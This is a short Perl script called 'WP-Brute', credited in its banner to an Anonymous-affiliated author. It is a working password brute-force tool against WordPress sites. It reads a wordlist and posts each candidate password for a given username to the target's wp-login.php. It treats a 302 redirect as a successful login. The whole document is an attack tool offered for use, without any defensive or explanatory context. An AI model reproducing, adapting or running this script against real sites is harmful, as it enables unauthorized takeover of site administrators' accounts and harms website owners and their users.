	

#!/usr/bin/perl
use HTTP::Request;
use LWP::UserAgent;
print" \n";
print"++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#\n";
print"++            [!]      WP-Brute       [!]               ++#\n";
print"++            [!] Developed By Xelj   [!]               ++#\n";
print"++            [!] Anonymous Catalunya [!]               ++#\n";
print"++                                                      ++#\n";
print"++           [!] Twitter @YourAnonXelj [!]              ++#\n";
print"++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#\n";     
    $site = $ARGV[0];
    $user = $ARGV[1];
    $wordl = $ARGV[2];
     
    if(@ARGV != 3){
    print "
    WP-Brute by Xelj
     
    usage  $0 <site> <user> <wordlist>
    exe: $0 site.com admin wordlist.txt
     
    ";
    exit;
    }
     
    if ($site !~ /^http:\/\//){
    $site = 'http://' . $site;
    }
    if ($site !~ /\/wp-login.php/){
    $site = $site . '/wp-login.php';
    }
     
    open(a,"<$wordl") or die "$!";
    print "\n\nSite: $site\nUsername: $user\n\nAttacking...\n\n";
    sleep(2);
    while(<a>){
    chomp($_);
     
    my $ua = new LWP::UserAgent;
     
    my $response
    = $ua->post($site,
    { log => $user,
    pwd => $_,
    wp-submit => 'Log in',
    });
     
    my $code = $response->code;
    print "[+] Testing Password $_\n";
    if($code == 302){
    print "\n\n\t[*] Password Found: $_\n\n";
    exit;
    }
    }
    exit;

